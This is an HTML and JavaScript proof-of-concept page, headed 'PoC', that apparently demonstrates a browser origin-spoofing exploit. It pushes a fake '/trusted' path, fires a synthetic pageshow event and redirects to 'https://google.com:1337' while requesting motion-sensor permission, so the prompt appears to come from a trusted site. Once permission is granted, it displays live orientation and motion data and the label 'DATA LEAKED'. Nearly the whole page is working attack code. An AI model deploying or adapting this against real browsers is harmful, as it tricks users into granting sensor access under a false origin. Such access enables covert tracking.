<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>testing</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, system-ui;
        background: #f5f5f7;
      }
      button {
        font-size: 15px;
        padding: 10px 14px;
        border-radius: 10px;
        border: none;
        background: #007aff;
        color: #fff;
        display: inline-block;
        cursor: pointer;
        font-weight: bold;
      }
      #panel {
        display: none;
        max-width: 420px;
        margin: 80px auto;
        background: #fff;
        padding: 24px;
        border-radius: 16px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
        text-align: center;
      }
      .notice {
        margin-top: 14px;
        font-size: 13px;
        color: #b00020;
        font-weight: bold;
        display: none;
      }
      #sensor-data {
        margin-top: 20px;
        padding: 15px;
        background: #1c1e21;
        border-radius: 8px;
        font-family: monospace;
        font-size: 14px;
        color: #00ff00;
        display: none;
        text-align: left;
        border: 2px solid #333;
        line-height: 1.5;
      }
      .log-header {
        color: #5856d6;
        font-weight: bold;
        margin-bottom: 5px;
        display: block;
      }
    </style>
  </head>
  <body>
    <div style="text-align: center; margin-top: 60px" id="trigger-container">
      <button id="trigger" onclick="showPanel()">Click Here</button>
    </div>

    <div id="panel">
      <h2>PoC</h2>

      <button id="action-btn" onclick="triggerMotionBypass()">
        Verify Motion
      </button>

      <p id="output">Status: -</p>

      <div id="sensor-data">Waiting for sensor handshake...</div>

      <div class="notice" id="spoof-success">DATA LEAKED</div>
    </div>

    <script>
      const panel = document.getElementById("panel");
      const triggerContainer = document.getElementById("trigger-container");
      const output = document.getElementById("output");
      const spoofSuccess = document.getElementById("spoof-success");
      const sensorData = document.getElementById("sensor-data");

      let readyToSpoof = false;

      function showPanel() {
        triggerContainer.style.display = "none";
        panel.style.display = "block";
        history.pushState({}, "", "/trusted");
      }

      function triggerMotionBypass() {
        if (
          typeof DeviceOrientationEvent !== "undefined" &&
          typeof DeviceOrientationEvent.requestPermission === "function"
        ) {
          readyToSpoof = true;
          window.dispatchEvent(new Event("pageshow"));

          output.textContent = "Status: Waiting for address bar spoof...";

          setTimeout(() => {
            DeviceOrientationEvent.requestPermission()
              .then((permissionState) => {
                output.textContent = "Status: " + permissionState;

                if (permissionState === "granted") {
                  spoofSuccess.style.display = "block";
                  sensorData.style.display = "block";

                  window.addEventListener("deviceorientation", (event) => {
                    const alpha = event.alpha ? event.alpha.toFixed(2) : 0;
                    const beta = event.beta ? event.beta.toFixed(2) : 0;
                    const gamma = event.gamma ? event.gamma.toFixed(2) : 0;

                    sensorData.innerHTML = `
                      <span class="log-header">[ DEVICE ORIENTATION: ]</span>
                      Alpha (Z): ${alpha}°<br>
                      Beta  (X): ${beta}°<br>
                      Gamma (Y): ${gamma}°<br>
                    `;
                  });

                  window.addEventListener("devicemotion", (event) => {
                    const acc = event.acceleration;
                    const rot = event.rotationRate;

                    sensorData.innerHTML += `
                      <hr style="border:0; border-top:1px dashed #333; margin:10px 0;">
                      <span class="log-header">[ DEVICE MOTION ]</span>
                      Acc X: ${acc.x ? acc.x.toFixed(4) : 0}<br>
                      Acc Y: ${acc.y ? acc.y.toFixed(4) : 0}<br>
                      Acc Z: ${acc.z ? acc.z.toFixed(4) : 0}<br>
                      Rot Rate: ${rot.alpha ? rot.alpha.toFixed(2) : 0}
                    `;
                  });
                }
              })
              .catch((err) => {
                output.textContent = "Error: " + err;
              });
          }, 500);
        } else {
          output.textContent = "Error: Motion API unsupported";
        }
      }

      window.addEventListener("pageshow", () => {
        if (!readyToSpoof) return;

        requestAnimationFrame(() => {
          requestAnimationFrame(() => {
            setTimeout(() => {
              location.href = "https://google.com:1337";
            }, 80);
          });
        });
      });
    </script>
  </body>
</html>
